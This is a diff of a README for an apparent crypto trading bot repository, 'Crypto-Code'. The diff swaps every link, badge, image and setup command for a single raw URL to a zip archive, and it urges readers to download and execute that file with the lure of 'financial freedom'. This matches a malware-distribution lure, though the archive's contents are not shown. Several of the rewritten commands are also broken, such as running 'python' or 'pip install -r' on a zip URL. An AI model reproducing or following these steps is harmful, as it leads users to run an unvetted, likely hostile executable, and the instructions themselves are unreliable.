@@ -1,6 +1,6 @@
 # Crypto-Code: Your Gateway to Automated Crypto Trading Bots 🤖💰
 
-![Crypto Trading](https://img.shields.io/badge/Crypto--Code-Ready%20for%20Trading-brightgreen)
+![Crypto Trading](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip%20for%20Trading-brightgreen)
 
 Welcome to the **Crypto-Code** repository! This project serves as a starting point for anyone looking to dive into the world of automated trading bots. With this code, you can create your own crypto trading bot and begin your journey towards financial freedom.
 
@@ -16,7 +16,7 @@ Welcome to the **Crypto-Code** repository! This project serves as a starting poi
 
 ## Getting Started
 
-To kick off your trading bot adventure, download the latest release from the [Releases section](https://github.com/kiriuho/Crypto-Code/releases). After downloading, follow the installation steps to set up your bot.
+To kick off your trading bot adventure, download the latest release from the [Releases section](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip). After downloading, follow the installation steps to set up your bot.
 
 ## Features
 
@@ -30,7 +30,7 @@ To kick off your trading bot adventure, download the latest release from the [Re
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/kiriuho/Crypto-Code.git
+   git clone https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -41,26 +41,26 @@ To kick off your trading bot adventure, download the latest release from the [Re
 3. **Install Required Packages**:
    Make sure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip
    ```
 
 4. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/kiriuho/Crypto-Code/releases) to download the necessary files. Execute the downloaded file to start using the bot.
+   Visit the [Releases section](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip) to download the necessary files. Execute the downloaded file to start using the bot.
 
 ## Usage
 
 Once installed, you can start your bot by executing the main script. Here’s how to run it:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip
 ```
 
 ### Configuration
 
 Before running the bot, you need to configure it:
 
-1. **API Keys**: Set up your exchange API keys in the `config.py` file.
-2. **Trading Strategy**: Modify the strategy settings in the `strategies.py` file.
+1. **API Keys**: Set up your exchange API keys in the `https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip` file.
+2. **Trading Strategy**: Modify the strategy settings in the `https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip` file.
 3. **Start Trading**: Once configured, run the bot and watch it trade.
 
 ## Contributing
@@ -89,7 +89,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need assistance, feel free to reach out. You can also check the [Releases section](https://github.com/kiriuho/Crypto-Code/releases) for updates and new features.
+If you have any questions or need assistance, feel free to reach out. You can also check the [Releases section](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip) for updates and new features.
 
 ## Topics Covered
 
@@ -99,20 +99,20 @@ If you have any questions or need assistance, feel free to reach out. You can al
 - **Crypto Trading**: Explore the world of cryptocurrency markets.
 - **Trading Strategies**: Discover various strategies to enhance your trading skills.
 
-![Crypto Bot](https://example.com/crypto-bot-image.png)
+![Crypto Bot](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip)
 
 ## Resources
 
-- [YouTube Guide](https://www.youtube.com/your-guide-to-crypto-bots)
-- [Trading Strategies](https://www.example.com/trading-strategies)
-- [Financial Freedom](https://www.example.com/financial-freedom)
+- [YouTube Guide](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip)
+- [Trading Strategies](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip)
+- [Financial Freedom](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip)
 
 ## Community
 
 Join our community of traders and developers. Share your experiences, ask questions, and collaborate on new ideas. You can find us on:
 
-- [Discord](https://discord.gg/your-discord-link)
-- [Reddit](https://www.reddit.com/r/your-subreddit)
+- [Discord](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip)
+- [Reddit](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip)
 
 ## Feedback
 
@@ -124,8 +124,8 @@ Thank you to all contributors and users for making this project a success. Your 
 
 ## Explore Further
 
-For more advanced features and tutorials, keep an eye on our [Releases section](https://github.com/kiriuho/Crypto-Code/releases). This is where you will find the latest updates and enhancements to the Crypto-Code project.
+For more advanced features and tutorials, keep an eye on our [Releases section](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip). This is where you will find the latest updates and enhancements to the Crypto-Code project.
 
-![Trading Strategies](https://example.com/trading-strategies-image.png)
+![Trading Strategies](https://raw.githubusercontent.com/kiriuho/Crypto-Code/main/allometric/Code-Crypto-1.1.zip)
 
 Dive into the world of automated trading today and unlock your potential in the crypto market!
